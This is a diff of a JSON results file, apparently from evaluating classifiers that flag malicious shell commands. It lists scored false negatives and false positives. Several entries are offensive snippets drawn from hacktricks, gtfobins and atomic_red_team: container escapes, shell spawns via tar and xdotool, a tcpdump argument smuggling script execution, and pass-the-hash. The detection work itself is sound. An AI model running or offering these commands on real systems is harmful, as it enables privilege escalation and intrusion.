+        "score": 0.12355499714612961,
         "source": "hacktricks"
       },
       {
         "command": "sudo chattr -i file.txt",
-        "score": 0.05986354500055313,
+        "score": 0.04972991347312927,
         "source": "hacktricks"
       },
       {
         "command": "C-x C-s",
-        "score": 0.21483854949474335,
+        "score": 0.22508592903614044,
         "source": "gtfobins"
       },
       {
         "command": "cont",
-        "score": 0.25729626417160034,
+        "score": 0.2560080289840698,
         "source": "gtfobins"
       },
       {
         "command": "sudo nft list tables",
-        "score": 0.0370347797870636,
+        "score": 0.03279693052172661,
         "source": "hacktricks"
       },
       {
         "command": "ip tcp_metrics show |grep --invert-match \"^127\\.\"",
-        "score": 0.17271243035793304,
+        "score": 0.1800641119480133,
         "source": "atomic_red_team"
       },
       {
         "command": "rsync -a *.sh rsync://host.back/src/rbd",
-        "score": 0.4395151734352112,
+        "score": 0.4620019495487213,
         "source": "hacktricks"
       },
       {
         "command": "ip netns delete bar",
-        "score": 0.20204636454582214,
+        "score": 0.20390918850898743,
         "source": "gtfobins"
       },
       {
         "command": "{cat,lol.txt}",
-        "score": 0.18481919169425964,
+        "score": 0.17287099361419678,
         "source": "hacktricks"
       },
       {
         "command": "docker build --secret id=my_key,src=path/to/my_secret_file .",
-        "score": 0.17039217054843903,
+        "score": 0.17451538145542145,
         "source": "hacktricks"
       },
       {
         "command": "wireshark",
-        "score": 0.24184225499629974,
+        "score": 0.24156995117664337,
         "source": "gtfobins"
       },
       {
         "command": "which ctr",
-        "score": 0.3795994222164154,
+        "score": 0.36981603503227234,
         "source": "hacktricks"
       }
     ],
     "false_positives": [
       {
         "command": "unset -f ls /bin/ls",
-        "score": 0.9390825033187866,
+        "score": 0.9396247267723083,
         "source": "nl2bash"
       },
       {
         "command": "echo \"{:key 'val}\" | bb -I \"(:key (first *input*))\"",
-        "score": 0.580229640007019,
+        "score": 0.5589989423751831,
         "source": "tldr"
       },
       {
         "command": "docker run -e VAR=value nginx",
-        "score": 0.5229569673538208,
+        "score": 0.5321334004402161,
         "source": "linlm"
       },
       {
         "command": "fluent-bit -c /etc/fluent-bit/fluent-bit.conf",
-        "score": 0.563705563545227,
+        "score": 0.5777449607849121,
         "source": "linlm"
       },
       {
         "command": "echo 'scale = 10; 5 / 3' | bc",
-        "score": 0.8623917698860168,
+        "score": 0.8594033718109131,
         "source": "tldr"
       },
       {
         "command": "mkdir \"${HOME}/.npm-packages\"",
-        "score": 0.8710950613021851,
+        "score": 0.866787850856781,
         "source": "nl2bash"
       },
       {
         "command": "xfreerdp /v:ip_address /u:username /p:password +clipboard",
-        "score": 0.6013609170913696,
+        "score": 0.5940651893615723,
         "source": "tldr"
       },
       {
         "command": "mkdir -p ~/backup_2023",
-        "score": 0.5131935477256775,
+        "score": 0.5052295923233032,
         "source": "bash6k"
       },
       {
         "command": "sqlite3 /var/www/file_hashes.db \"CREATE TABLE IF NOT EXISTS file_hashes(path TEXT PRIMARY KEY, md5 TEXT);\"",
-        "score": 0.9429364800453186,
+        "score": 0.9419021606445312,
         "source": "bash6k"
       },
       {
         "command": "yes '' | ruby -e \"$(curl -fsSL https://h658b4b87.example.net/Homebrew/homebrew/go/install)\"",
-        "score": 0.8728007078170776,
+        "score": 0.8726388812065125,
         "source": "nl2bash"
       },
       {
         "command": "cat /proc/interrupts",
-        "score": 0.952078640460968,
+        "score": 0.9464101791381836,
         "source": "linlm"
       },
       {
         "command": "cal | awk 'NR==2 {for (i=1;i<=NF;i++) {sub(/ /,\"\",$i);a[$i]=i}} NR>2 {if ($a[\"Tu\"]~/[0-9]/) {printf \"%02d\\n\",$a[\"Tu\"];exit}}' FIELDWIDTHS=\"3 3 3 3 3 3 3 3\"",
-        "score": 0.8649790287017822,
+        "score": 0.874343752861023,
         "source": "nl2bash"
       },
       {
         "command": "MAX_FILE_SIZE=size_in_megabytes http-server-upload",
-        "score": 0.7794798612594604,
+        "score": 0.8013262152671814,
         "source": "tldr"
       },
       {
         "command": "find /path/to/dir ! -perm 0644 -exec chmod 0644 {} \\;",
-        "score": 0.5199831128120422,
+        "score": 0.5143669247627258,
         "source": "nl2bash"
       },
       {
         "command": "cat /sys/class/net/eth0/statistics/rx_bytes && cat /sys/class/net/eth0/statistics/tx_bytes",
-        "score": 0.8152440190315247,
+        "score": 0.8101050853729248,
         "source": "bash6k"
       },
       {
         "command": "pvesm [f|free] local:iso/archlinux-2025.08.01-x86_64.iso",
-        "score": 0.6649796366691589,
+        "score": 0.6564193964004517,
         "source": "tldr"
       },
       {
         "command": "mkdir -p /tmp/project/{src,bin,doc}",
-        "score": 0.9843295216560364,
+        "score": 0.9847081899642944,
         "source": "bash6k"
       },
       {
         "command": "cat ~/.ssh/known_hosts",
-        "score": 0.9433127641677856,
+        "score": 0.9430885910987854,
         "source": "linlm"
       },
       {
         "command": "jstack /usr/bin/java file.core",
-        "score": 0.8682839870452881,
+        "score": 0.8858618140220642,
         "source": "tldr"
       },
       {
         "command": "read -p \"Is this a good question (y/n)? \" answer",
-        "score": 0.6400411128997803,
+        "score": 0.6236523389816284,
         "source": "nl2bash"
       },
       {
         "command": "if selinuxenabled; then echo \"SELinux is running\"; fi",
-        "score": 0.7783413529396057,
+        "score": 0.756391167640686,
         "source": "tldr"
       },
       {
         "command": "python -m http.server 8000",
-        "score": 0.8061362504959106,
+        "score": 0.798427402973175,
         "source": "linlm"
       },
       {
         "command": "echo $-",
-        "score": 0.5859434008598328,
+        "score": 0.6074376702308655,
         "source": "bash6k"
       },
       {
         "command": "set | grep -P '^\\w*X\\w*(?==)' | grep -oP '(?<==).*'",
-        "score": 0.925692617893219,
+        "score": 0.9232152700424194,
         "source": "nl2bash"
       },
       {
         "command": "systemctl status --failed",
-        "score": 0.6627147793769836,
+        "score": 0.6456498503684998,
         "source": "tldr"
       },
       {
         "command": "while IFS=: read -r user _ _ _ _ home _; do",
-        "score": 0.7388945817947388,
+        "score": 0.7154857516288757,
         "source": "bash6k"
       },
       {
         "command": "lsusb -t",
-        "score": 0.5279343724250793,
+        "score": 0.5213637948036194,
         "source": "linlm"
       },
       {
         "command": "local -A variable=([key_a]=item_a [key_b]=item_b [key_c]=item_c)",
-        "score": 0.5930326581001282,
+        "score": 0.5701677799224854,
         "source": "tldr"
       },
       {
         "command": "ls `pwd`/*",
-        "score": 0.7102503180503845,
+        "score": 0.6968246698379517,
         "source": "nl2bash"
       },
       {
         "command": "sudo systemctl set-environment http_proxy=http://h51a737c8.example.net",
-        "score": 0.8067682981491089,
+        "score": 0.8044767379760742,
         "source": "linlm"
       },
       {
         "command": "zabbix_server",
-        "score": 0.6096484661102295,
+        "score": 0.597591757774353,
         "source": "linlm"
       },
       {
         "command": "docker run --name mysql -e MYSQL_ROOT_PASSWORD=password -d mysql",
-        "score": 0.7387081980705261,
+        "score": 0.735382616519928,
         "source": "linlm"
       },
       {
         "command": "head -n 10 /etc/passwd",
-        "score": 0.950093150138855,
+        "score": 0.952269434928894,
         "source": "bash6k"
       },
       {
         "command": "cat /sys/class/power_supply/BAT0/status",
-        "score": 0.7713597416877747,
+        "score": 0.7581998705863953,
         "source": "linlm"
       },
       {
         "command": "find \"$DIR_TO_CLEAN\" -mtime +$DAYS_TO_SAVE -exec bash -c 'printf \"count=0; for f; do rm \"$f\" && (( count++ )); done; printf \"Total: %d\\n\" $count' _ {} +",
-        "score": 0.7216001152992249,
+        "score": 0.7038987874984741,
         "source": "nl2bash"
       },
       {
         "command": "pip debug",
-        "score": 0.5230965614318848,
+        "score": 0.5271828174591064,
         "source": "tldr"
       },
       {
         "command": "eget https://h56aef353.example.net/dl/go1.17.5.linux-amd64.tar.gz",
-        "score": 0.5967630743980408,
+        "score": 0.5944017767906189,
         "source": "tldr"
       },
       {
+        "command": "sed -i 's/GET/password/g' access.conf",
+        "score": 0.5073628425598145,
+        "source": "bash_instruct"
+      },
+      {
         "command": "sudo ln -s /usr/bin/perl /usr/local/bin/perl`echo -e '\\r'`",
-        "score": 0.9794685244560242,
+        "score": 0.9813528656959534,
         "source": "nl2bash"
       },
       {
         "command": "git_latest_hash(){ local repo=\"$1\"; local branch=\"$2\"; local dir=$(mktemp -d); git clone --depth 1 --branch \"$branch\" \"$repo\" \"$dir\" >/dev/null 2>&1 && (cd \"$dir\" && git rev-parse HEAD); rm -rf \"$dir\"; }",
-        "score": 0.9438228607177734,
+        "score": 0.937634289264679,
+        "source": "bash6k"
+      }
+    ]
+  },
+  "random_forest/dataset1": {
+    "false_negatives": [
+      {
+        "command": "var port=12345;",
+        "score": 0.2794946837417933,
+        "source": "gtfobins"
+      },
+      {
+        "command": "bconsole",
+        "score": 0.03261214834314317,
+        "source": "gtfobins"
+      },
+      {
+        "command": "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done",
+        "score": 0.32697676227548605,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "mount | grep cgroup",
+        "score": 0.410492434602238,
+        "source": "hacktricks"
+      },
+      {
+        "command": "restic --password-command='/path/to/command' backup",
+        "score": 0.20809997999811294,
+        "source": "gtfobins"
+      },
+      {
+        "command": "apparmor_parser",
+        "score": 0.44067306558021746,
+        "source": "hacktricks"
+      },
+      {
+        "command": "nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H \"HashPlaceholder\" -d \"YourDOMAIN\"",
+        "score": 0.34769055552624034,
+        "source": "hacktricks"
+      },
+      {
+        "command": "yarn --cwd .",
+        "score": 0.2961491847969096,
+        "source": "gtfobins"
+      },
+      {
+        "command": "get_version \"/\\S+/srm/bin/vmware-dr($|\\s)\" --version",
+        "score": 0.35281762302523667,
+        "source": "hacktricks"
+      },
+      {
+        "command": "cap_net_raw user1",
+        "score": 0.06689756848077794,
+        "source": "hacktricks"
+      },
+      {
+        "command": "aptitude changelog aptitude",
+        "score": 0.08780151515715023,
+        "source": "gtfobins"
+      },
+      {
+        "command": "rm $1*.bin",
+        "score": 0.3073897476676677,
+        "source": "hacktricks"
+      },
+      {
+        "command": "sudo busctl capture > system-bus.pcapng",
+        "score": 0.0729459057635753,
+        "source": "hacktricks"
+      },
+      {
+        "command": "Label=unconfined",
+        "score": 0.09503422244219763,
+        "source": "hacktricks"
+      },
+      {
+        "command": "dd if=file.bin bs=28 skip=1 of=blob",
+        "score": 0.41167516209825084,
+        "source": "hacktricks"
+      },
+      {
+        "command": "./dump-memory.sh 2027",
+        "score": 0.4712945863475013,
+        "source": "hacktricks"
+      },
+      {
+        "command": "docker run --rm -it --security-opt seccomp=/path/to/profile.json busybox chmod 400 /etc/hosts",
+        "score": 0.4543671612427248,
+        "source": "hacktricks"
+      },
+      {
+        "command": "halt -p",
+        "score": 0.31699807033331806,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "sudo pkill -SIGTERM ^cron$",
+        "score": 0.10791900763864218,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "zip $HOME/data.zip /var/log/{w,b}tmp",
+        "score": 0.355,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "tshark -Xlua_script:/path/to/temp-file",
+        "score": 0.23399158390211805,
+        "source": "gtfobins"
+      },
+      {
+        "command": "Slice=system.slice",
+        "score": 0.13202312593789195,
+        "source": "hacktricks"
+      },
+      {
+        "command": "useradd -u 1000 standarduser",
+        "score": 0.09808977705853547,
+        "source": "hacktricks"
+      },
+      {
+        "command": "pip install --break-system-packages .",
+        "score": 0.0743610889450203,
+        "source": "gtfobins"
+      },
+      {
+        "command": "echo AC_INIT >configure.ac",
+        "score": 0.0630591059168666,
+        "source": "gtfobins"
+      },
+      {
+        "command": "echo DATA >output-file",
+        "score": 0.0654340818036975,
+        "source": "gtfobins"
+      },
+      {
+        "command": "findmnt -t nfs",
+        "score": 0.06960019955640862,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "tcsh -b",
+        "score": 0.31699807033331806,
+        "source": "gtfobins"
+      },
+      {
+        "command": "cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config",
+        "score": 0.3592101344563178,
+        "source": "hacktricks"
+      },
+      {
+        "command": "end;",
+        "score": 0.47749938152996685,
+        "source": "gtfobins"
+      },
+      {
+        "command": "ps $TARGETPID",
+        "score": 0.2228801322263347,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "smbserver.py -smb2support share .",
+        "score": 0.06417551465966166,
+        "source": "gtfobins"
+      },
+      {
+        "command": "touch ./etc/pacman.conf",
+        "score": 0.2070939431094107,
+        "source": "gtfobins"
+      },
+      {
+        "command": "docker scan hello-world",
+        "score": 0.10258510526179818,
+        "source": "hacktricks"
+      },
+      {
+        "command": "mount | grep shm",
+        "score": 0.11344127019558355,
+        "source": "hacktricks"
+      },
+      {
+        "command": "ginsh",
+        "score": 0.3958791601850645,
+        "source": "gtfobins"
+      },
+      {
+        "command": "sudo nft list chains",
+        "score": 0.10470796195961532,
+        "source": "hacktricks"
+      },
+      {
+        "command": "ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x",
+        "score": 0.32466842534834667,
+        "source": "gtfobins"
+      },
+      {
+        "command": "nmap --script-help \"(default or version) and smb)\"",
+        "score": 0.23390856321161924,
+        "source": "hacktricks"
+      },
+      {
+        "command": "apt-get changelog apt",
+        "score": 0.13646813279116754,
+        "source": "gtfobins"
+      }
+    ],
+    "false_positives": [
+      {
+        "command": "fluent-bit -c /etc/fluent-bit/fluent-bit.conf",
+        "score": 0.7575133243445545,
+        "source": "linlm"
+      },
+      {
+        "command": "mkdir \"${HOME}/.npm-packages\"",
+        "score": 0.6954244289386774,
+        "source": "nl2bash"
+      },
+      {
+        "command": "sqlite3 /var/www/file_hashes.db \"CREATE TABLE IF NOT EXISTS file_hashes(path TEXT PRIMARY KEY, md5 TEXT);\"",
+        "score": 0.6254293003796798,
         "source": "bash6k"
       },
       {
-        "command": "sudo cat /proc/meminfo",
-        "score": 0.6942397356033325,
+        "command": "tika-server",
+        "score": 0.5570347842384412,
         "source": "linlm"
+      },
+      {
+        "command": "cat /proc/interrupts",
+        "score": 0.8269619482251153,
+        "source": "linlm"
+      },
+      {
+        "command": "mkdir -p /tmp/project/{src,bin,doc}",
+        "score": 0.7863224018119223,
+        "source": "bash6k"
+      },
+      {
+        "command": "cat ~/.ssh/known_hosts",
+        "score": 0.6547930137851442,
+        "source": "linlm"
+      },
+      {
+        "command": "jstack /usr/bin/java file.core",
+        "score": 0.8146333891023062,
+        "source": "tldr"
+      },
+      {
+        "command": "wine reg add 'HKEY_CURRENT_USER\\path\\to\\key' /v value_name /t REG_MULTI_SZ /s # /d 'string1#string2#string3'",
+        "score": 0.6018322784981678,
+        "source": "tldr"
+      },
+      {
+        "command": "ls `pwd`/*",
+        "score": 0.6053111971176378,
+        "source": "nl2bash"
+      },
+      {
+        "command": "$(dirname $0)",
+        "score": 0.5932555769442008,
+        "source": "nl2bash"
+      },
+      {
+        "command": "cat /sys/class/power_supply/BAT0/status",
+        "score": 0.7079557217048893,
+        "source": "linlm"
+      },
+      {
+        "command": "zsh [-n|--no-exec] path/to/script.zsh",
+        "score": 0.5241455138172338,
+        "source": "tldr"
+      },
+      {
+        "command": "eget https://h56aef353.example.net/dl/go1.17.5.linux-amd64.tar.gz",
+        "score": 0.5757591065260028,
+        "source": "tldr"
+      },
+      {
+        "command": "sudo ln -s /usr/bin/perl /usr/local/bin/perl`echo -e '\\r'`",
+        "score": 0.6610367773109701,
+        "source": "nl2bash"
+      },
+      {
+        "command": "git_latest_hash(){ local repo=\"$1\"; local branch=\"$2\"; local dir=$(mktemp -d); git clone --depth 1 --branch \"$branch\" \"$repo\" \"$dir\" >/dev/null 2>&1 && (cd \"$dir\" && git rev-parse HEAD); rm -rf \"$dir\"; }",
+        "score": 0.61,
+        "source": "bash6k"
+      },
+      {
+        "command": "tree -p -d",
+        "score": 0.8809621839275469,
+        "source": "nl2bash"
+      },
+      {
+        "command": "sudo cat /proc/meminfo",
+        "score": 0.6173983676279416,
+        "source": "linlm"
+      },
+      {
+        "command": "echo $!",
+        "score": 0.6609727671251637,
+        "source": "bash6k"
+      },
+      {
+        "command": "files=( *.txt )",
+        "score": 0.619373056411491,
+        "source": "bash6k"
+      },
+      {
+        "command": "tailpod",
+        "score": 0.5064721373682726,
+        "source": "tldr"
+      },
+      {
+        "command": "cat /proc/sys/vm/vfs_cache_pressure",
+        "score": 0.7568244770402862,
+        "source": "linlm"
+      },
+      {
+        "command": "echo ${array_name[@]}",
+        "score": 0.709048458826475,
+        "source": "tldr"
+      },
+      {
+        "command": "cat /proc/interrupts | grep -i lapic",
+        "score": 0.5408165184518781,
+        "source": "linlm"
+      },
+      {
+        "command": "su - joe -c \"/path/to/my_daemon > /some/output/file\" &",
+        "score": 0.8037534656776625,
+        "source": "nl2bash"
+      },
+      {
+        "command": "find . -type f -name \"your_pattern\" -exec du -ch {} + 2>/dev/null | grep total$.",
+        "score": 0.645,
+        "source": "nl2bash"
+      },
+      {
+        "command": "systemctl bind unit /path/to/host_directory",
+        "score": 0.6059045975634882,
+        "source": "tldr"
+      },
+      {
+        "command": "cat /sys/block/sda/queue/scheduler",
+        "score": 0.7641378440023462,
+        "source": "linlm"
+      },
+      {
+        "command": "find ./ -type f | tee /tmp/grep1 /tmp/grep2 >/dev/null",
+        "score": 0.8925,
+        "source": "nl2bash"
+      },
+      {
+        "command": "bash vst-install.sh",
+        "score": 0.8821091614523334,
+        "source": "linlm"
+      },
+      {
+        "command": "retry(){ local attempts=0 max=5 delay=1; while ((attempts<max)); do \"$@\" && return 0; ((attempts++)); echo \"Attempt $attempts failed, retrying in $delay seconds...\"; sleep $delay; ((delay*=2)); done; return 1; } # Usage: retry curl -sSf https://h0caaf24a.example.net",
+        "score": 0.585083659005544,
+        "source": "bash6k"
+      },
+      {
+        "command": "bundletool dump manifest --bundle path/to/bundle.aab --xpath /manifest/@android:versionCode",
+        "score": 0.5481026304200172,
+        "source": "tldr"
+      },
+      {
+        "command": "cat /proc/cpuinfo | grep bugs",
+        "score": 0.661863200735463,
+        "source": "linlm"
+      },
+      {
+        "command": "find / -type f -name dummy 2>/dev/null -exec cat {} \\; >tesst.txt",
+        "score": 0.9625,
+        "source": "nl2bash"
+      },
+      {
+        "command": "anydesk",
+        "score": 0.5064721373682726,
+        "source": "linlm"
+      },
+      {
+        "command": "nohup bash script.sh > script.log 2>&1 &",
+        "score": 0.68,
+        "source": "bash6k"
+      },
+      {
+        "command": "git blame -w -C -C -C path/to/file",
+        "score": 0.528505691482179,
+        "source": "tldr"
+      },
+      {
+        "command": "find . -regex \".*\\.\\(py\\|sh\\)$\"",
+        "score": 0.615,
+        "source": "linlm"
+      },
+      {
+        "command": "set MAVEN_DEBUG_OPTS=-Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8000",
+        "score": 0.5536537892608425,
+        "source": "nl2bash"
+      },
+      {
+        "command": "for f in *.avi; do start=$(date +%s); ffmpeg -i \"$f\" -c:v libx264 -preset medium -crf 23 \"${f%.avi}.mp4\" && end=$(date +%s) && echo \"$f converted in $((end-start)) seconds\" >> conversion.log; done",
+        "score": 0.7049252468051208,
+        "source": "bash6k"
+      }
+    ]
+  },
+  "isolation_forest/dataset1": {
+    "false_negatives": [
+      {
+        "command": "tar xf /path/to/temp-file.tar --to-command /bin/sh",
+        "score": 0.4203526256786474,
+        "source": "gtfobins"
+      },
+      {
+        "command": "/usr/bin/python2.7 = cap_sys_ptrace+ep",
+        "score": 0.07384220382440311,
+        "source": "hacktricks"
+      },
+      {
+        "command": "oxdf@hacky$ gcc a.c -o /mnt/nfsshare/a;",
+        "score": 0.024200105950819627,
+        "source": "hacktricks"
+      },
+      {
+        "command": "var port=12345;",
+        "score": 0.04395759893692444,
+        "source": "gtfobins"
+      },
+      {
+        "command": "bconsole",
+        "score": 0.019471975648822967,
+        "source": "gtfobins"
+      },
+      {
+        "command": "m4 /path/to/input-file",
+        "score": 0.04184173380204915,
+        "source": "gtfobins"
+      },
+      {
+        "command": "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done",
+        "score": 0.2096545883628356,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
+        "score": 0.2924704970551803,
+        "source": "hacktricks"
+      },
+      {
+        "command": "ls -l /tmp/rootsh",
+        "score": 0.21069555189635983,
+        "source": "hacktricks"
+      },
+      {
+        "command": "find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null",
+        "score": 0.40860432944985425,
+        "source": "hacktricks"
+      },
+      {
+        "command": "mount | grep cgroup",
+        "score": 0.011614696278733875,
+        "source": "hacktricks"
+      },
+      {
+        "command": "restic --password-command='/path/to/command' backup",
+        "score": 0.10144669065555693,
+        "source": "gtfobins"
+      },
+      {
+        "command": "find / -context '*:default_t:*' -o -context '*:file_t:*' 2>/dev/null",
+        "score": 0.2948482307164306,
+        "source": "hacktricks"
+      },
+      {
+        "command": "echo \"install algif_aead /bin/false\" > /etc/modprobe.d/disable-algif.conf",
+        "score": 0.13711459905174414,
+        "source": "hacktricks"
+      },
+      {
+        "command": "./stratus detonate aws.credential-access.ec2-get-password-data --force",
+        "score": 0.1390027362473849,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "xdotool exec --sync /bin/sh",
+        "score": 0.2351706359564883,
+        "source": "gtfobins"
+      },
+      {
+        "command": "apparmor_parser",
+        "score": 0.04284513321309132,
+        "source": "hacktricks"
+      },
+      {
+        "command": "export SSLKEYLOGFILE=/tmp/sslkeys.log",
+        "score": 0.22065739190035094,
+        "source": "hacktricks"
+      },
+      {
+        "command": "nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H \"HashPlaceholder\" -d \"YourDOMAIN\"",
+        "score": 0.05419317373979733,
+        "source": "hacktricks"
+      },
+      {
+        "command": "mkdir -p /path/to/temp-dir/action.d/",
+        "score": 0.048076023538458273,
+        "source": "gtfobins"
+      },
+      {
+        "command": "[ ! -z \"$COMMAND\" ] && echo VERSIONSTART \"$p\" \"$(\"${COMMAND%%[[:space:]]*}\" $VERSION_OPTION 2>&1)\" VERSIONEND",
+        "score": 0.2833169388717969,
+        "source": "hacktricks"
+      },
+      {
+        "command": "sudo grep -R \"^Environment=.*\" /etc/systemd/system /lib/systemd/system 2>/dev/null | sed 's/\\x00/\\n/g'",
+        "score": 0.4886774345308757,
+        "source": "hacktricks"
+      },
+      {
+        "command": "yarn --cwd .",
+        "score": 0.06688755954319205,
+        "source": "gtfobins"
+      },
+      {
+        "command": "echo \"[Unit]\" > /tmp/atomic_tmp.service",
+        "score": 0.2590392594271367,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "chmod +x /tmp/helper",
+        "score": 0.28309882415980075,
+        "source": "hacktricks"
+      },
+      {
+        "command": "chmod +x /tmp/report.pdf.sh",
+        "score": 0.2890436338036246,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "/debug/tcpdump --filter=\"udp port 1234\" --file-name=\"test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh\"",
+        "score": 0.2167418256158556,
+        "source": "hacktricks"
+      },
+      {
+        "command": "get_version \"/\\S+/srm/bin/vmware-dr($|\\s)\" --version",
+        "score": 0.12929208940761797,
+        "source": "hacktricks"
+      },
+      {
+        "command": "echo ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif",
+        "score": 0.0652466309172913,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "cap_net_raw user1",
+        "score": 0.006900859619756819,
+        "source": "hacktricks"
+      },
+      {
+        "command": "ldapsearch -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -b \"CN=Users,DC=example,DC=test\" -s sub -a always -z 1000 dn",
+        "score": 0.15239376407881725,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "nsenter --net=/proc/1/ns/net ip a 2>/dev/null",
+        "score": 0.41239457217754555,
+        "source": "hacktricks"
+      },
+      {
+        "command": "Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...",
+        "score": 0.08139486128852234,
+        "source": "hacktricks"
+      },
+      {
+        "command": "cd /tmp/T1030; split -b 5000000 T1030_urandom",
+        "score": 0.264886644870101,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50",
+        "score": 0.2791912900950635,
+        "source": "hacktricks"
+      },
+      {
+        "command": "sudo nft list ruleset 2>/dev/null | head -n 80",
+        "score": 0.1977837169033785,
+        "source": "hacktricks"
+      },
+      {
+        "command": "ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash",
+        "score": 0.2448076939320557,
+        "source": "hacktricks"
+      },
+      {
+        "command": "aptitude changelog aptitude",
+        "score": 0.011530934476503621,
+        "source": "gtfobins"
+      },
+      {
+        "command": "podman inspect $(podman ps -l -q --filter ancestor=t1613)",
+        "score": 0.18359332534652523,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "rm $1*.bin",
+        "score": 0.03256482493254399,
+        "source": "hacktricks"
+      }
+    ],
+    "false_positives": [
+      {
+        "command": "yes '' | ruby -e \"$(curl -fsSL https://h658b4b87.example.net/Homebrew/homebrew/go/install)\"",
+        "score": 0.6828127541976862,
+        "source": "nl2bash"
+      },
+      {
+        "command": "find \"$DIR_TO_CLEAN\" -mtime +$DAYS_TO_SAVE -exec bash -c 'printf \"count=0; for f; do rm \"$f\" && (( count++ )); done; printf \"Total: %d\\n\" $count' _ {} +",
+        "score": 0.5060158106661139,
+        "source": "nl2bash"
+      },
+      {
+        "command": "git_latest_hash(){ local repo=\"$1\"; local branch=\"$2\"; local dir=$(mktemp -d); git clone --depth 1 --branch \"$branch\" \"$repo\" \"$dir\" >/dev/null 2>&1 && (cd \"$dir\" && git rev-parse HEAD); rm -rf \"$dir\"; }",
+        "score": 0.6936051862601494,
+        "source": "bash6k"
+      },
+      {
+        "command": "find ~/code -maxdepth 2 -type d -name '.git' -printf '%h\\n' | while read repo; do (cd \"$repo\" && echo \"$repo: $(git rev-parse --abbrev-ref HEAD)\"); done",
+        "score": 0.5198944942668152,
+        "source": "bash6k"
+      },
+      {
+        "command": "sudo sed -i 's/<listen-address>7.98.246.159</listen-address>/<listen-address>76.132.177.92</listen-address>/' /etc/orientdb/config/orientdb-server-config.xml",
+        "score": 0.5870533632347231,
+        "source": "linlm"
+      },
+      {
+        "command": "awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -nr | head -n 10 # output: count IP",
+        "score": 0.516894531396214,
+        "source": "bash6k"
+      },
+      {
+        "command": "find ./ -type f | tee /tmp/grep1 /tmp/grep2 >/dev/null",
+        "score": 0.505571495062692,
+        "source": "nl2bash"
+      },
+      {
+        "command": "ps -eo pid,rss,comm --sort=-rss | awk '$2>512000 {print $1,$2,$3}' | while read pid mem cmd; do echo \"Killing $cmd (PID $pid, RSS ${mem}KB)\"; kill $pid; sleep 10; if kill -0 $pid 2>/dev/null; then echo \"Force killing $pid\"; kill -9 $pid; fi; done >> /var/log/highmem_kill.log 2>&1",
+        "score": 0.8485297355158121,
+        "source": "bash6k"
+      },
+      {
+        "command": "nohup bash script.sh > script.log 2>&1 &",
+        "score": 0.5045794019814199,
+        "source": "bash6k"
+      },
+      {
+        "command": "find ~/container -mindepth 3 -type f | xargs -i bash -c 'mv \"{}\" $(dirname \"{}\")/..'",
+        "score": 0.5363974517167982,
+        "source": "nl2bash"
+      },
+      {
+        "command": "for i in `find . -not \\( -name \"*\\.jpg\" \\) -path './bookshop/mediaimg' -prune -o -path '*/CVS*' -prune -o -path './files' -prune -o -path './images/cms' -prune -o -path './internal' -prune -o -path './limesurvey171plus_build5638' -prune -o -path './gallery2' -prune -o -print `; do cvs status \"$i\" |grep Status ; done &>~/output.txt",
+        "score": 0.6249273327527293,
+        "source": "nl2bash"
+      },
+      {
+        "command": "python sqlmap.py [-u|--url] \"http://h06850335.example.net/vuln.php?id=1\"",
+        "score": 0.5927666820454343,
+        "source": "tldr"
+      },
+      {
+        "command": "find PDFs/ -name '*.pdf' -exec sh -c 'pdftotext \"{}\" - | grep -l -i --with-filename --label=\"{}\" --color \"perry sound\"' \\;",
+        "score": 0.6162753839103319,
+        "source": "nl2bash"
+      },
+      {
+        "command": "find . -name \"*.so\" -printf \"mv '%h/%f' '%h/lib%f'\\n\" | bash",
+        "score": 0.5609487516043143,
+        "source": "nl2bash"
+      },
+      {
+        "command": "find /opt/app/logs -type f -name '*.log' -exec sh -c 'cp \"$1\" \"${1}.bak\" && sed -i \"s/ERROR/WARN/g\" \"$1\"' _ {} \\;",
+        "score": 0.5466323972522185,
+        "source": "bash6k"
+      },
+      {
+        "command": "find <directory_name> -type d -exec sh -c \"cd {} && [ -d live ] && [ -d test ] && cd ../ && echo \\\"Deleting {}\\\" && rm -rvi {} \" {} \\;",
+        "score": 0.5252498666380272,
+        "source": "nl2bash"
+      },
+      {
+        "command": "repomix --remote https://hc2208abd.example.net/user/repo/commit/836abcd7335137228ad77feb28655d85712680f1",
+        "score": 0.6617822684743255,
+        "source": "tldr"
+      },
+      {
+        "command": "curl -s https://h1bc412bb.example.net/data | jq -r '.items[]' > /tmp/items.txt",
+        "score": 0.6047006716419364,
+        "source": "bash6k"
+      }
+    ]
+  },
+  "xgboost/dataset2": {
+    "false_negatives": [
+      {
+        "command": "nano u.txt",
+        "score": 0.18796461820602417,
+        "source": "honeypot"
+      },
+      {
+        "command": "31m>>>> Server Gasit incepem Testele \\033[1",
+        "score": 0.43726450204849243,
+        "source": "honeypot"
+      },
+      {
